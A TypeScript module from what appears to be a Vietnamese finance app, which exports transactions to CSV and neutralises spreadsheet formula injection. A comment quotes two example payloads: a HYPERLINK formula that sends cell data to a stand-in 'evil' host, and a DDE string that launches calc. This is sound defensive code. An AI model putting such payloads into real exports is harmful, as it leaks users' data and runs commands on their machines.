import { formatVND } from './currency'
import { formatDisplayDate } from './dates'
import type { Transaction } from '@/types/account'
import type { CreditCardTransaction } from '@/types/creditCard'
import type { BankAccount } from '@/types/account'
import type { CreditCard } from '@/types/creditCard'
import { formatMcc } from './mcc'

export interface CSVTransactionRow {
  'Ngày': string
  'Mô tả': string
  'Số tiền': string
  'Loại': string
  'Tài khoản': string
  'Danh mục': string
  /**
   * CHỈ có ở giao dịch thẻ (bỏ hẳn khỏi file xuất của tài khoản ngân hàng để khỏi thêm một cột
   * luôn trống). Thẻ chưa phân loại thì để trống nhưng vẫn có cột, để các dòng cùng một file khớp tiêu đề.
   */
  'MCC'?: string
}

/**
 * Vô hiệu hoá công thức trong ô CSV (CSV formula / DDE injection).
 *
 * Excel/LibreOffice/Sheets ĐÁNH GIÁ ô bắt đầu bằng `= + - @` (và tab/CR) như công
 * thức — kể cả khi ô đã được quote, nên việc papaparse quote dấu phẩy KHÔNG phải
 * là phòng thủ. `description`/`merchantName` lấy nguyên văn từ SMS ngân hàng, tức
 * là nội dung ta KHÔNG kiểm soát: một mô tả dạng
 * `=HYPERLINK("http://evil/?d="&A1,"refund")` sẽ beacon dữ liệu dòng đó ra ngoài
 * khi người dùng mở file, còn `+cmd|' /C calc'!A0` là DDE trên Excel cũ.
 *
 * Thêm dấu nháy đơn phía trước: Excel hiểu là "ô text", hiển thị nguyên văn và
 * không chạy công thức.
 */
function neutralizeFormula(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
}

/**
 * Transform a Transaction or CreditCardTransaction to a CSV row with Vietnamese headers.
 * @param tx Transaction or CreditCardTransaction object
 * @param accountOrCard Optional BankAccount or CreditCard for account/card name
 * @param categoryOverrides Optional Map of transaction ID to category override
 */
export function formatTransactionForCSV(
  tx: Transaction | CreditCardTransaction,
  accountOrCard?: BankAccount | CreditCard,
  categoryOverrides?: Map<string, string>
): CSVTransactionRow {
  const isBankAccount = accountOrCard && 'accountName' in accountOrCard
  const accountName = isBankAccount
    ? (accountOrCard as BankAccount).accountName
    : accountOrCard && 'cardName' in accountOrCard
      ? (accountOrCard as CreditCard).cardName
      : 'N/A'

  // Map transaction type to Vietnamese label
  const typeLabel = tx.type === 'income' || tx.type === 'payment' ? 'Thu nhập' : 'Chi tiêu'

  // Get category from overrides or original transaction
  const category = categoryOverrides?.get(tx.id) ?? tx.category ?? 'Khác'

  // Sanitize mọi field có nguồn từ dữ liệu (không phải hằng số trong code):
  // description/merchantName đến từ SMS ngân hàng, accountName/category từ DB.
  return {
    'Ngày': formatDisplayDate(tx.transactionDate),
    'Mô tả': neutralizeFormula(tx.description),
    'Số tiền': formatVND(Math.abs(tx.amount)),
    'Loại': typeLabel,
    'Tài khoản': neutralizeFormula(accountName),
    'Danh mục': neutralizeFormula(category),
    // `cardId` chỉ có ở CreditCardTransaction: dùng nó để phân biệt giao dịch thẻ với giao dịch tài khoản.
    ...('cardId' in tx ? { 'MCC': tx.mcc ? formatMcc(tx.mcc) : '' } : {}),
  }
}

/**
 * Download a CSV string as a file with UTF-8 BOM for Excel compatibility.
 * @param csvString Comma-separated values (typically from Papa.unparse)
 * @param filename Name for the downloaded file
 */
export function downloadCSV(csvString: string, filename: string): void {
  // Prepend UTF-8 BOM for Excel compatibility
  const csvWithBOM = '\ufeff' + csvString

  // Create Blob with CSV MIME type
  const blob = new Blob([csvWithBOM], { type: 'text/csv;charset=utf-8' })

  // Create temporary download link
  const url = URL.createObjectURL(blob)
  const anchor = document.createElement('a')
  anchor.href = url
  anchor.download = filename

  // Trigger download
  document.body.appendChild(anchor)
  anchor.click()
  document.body.removeChild(anchor)

  // Clean up Blob URL
  URL.revokeObjectURL(url)
}
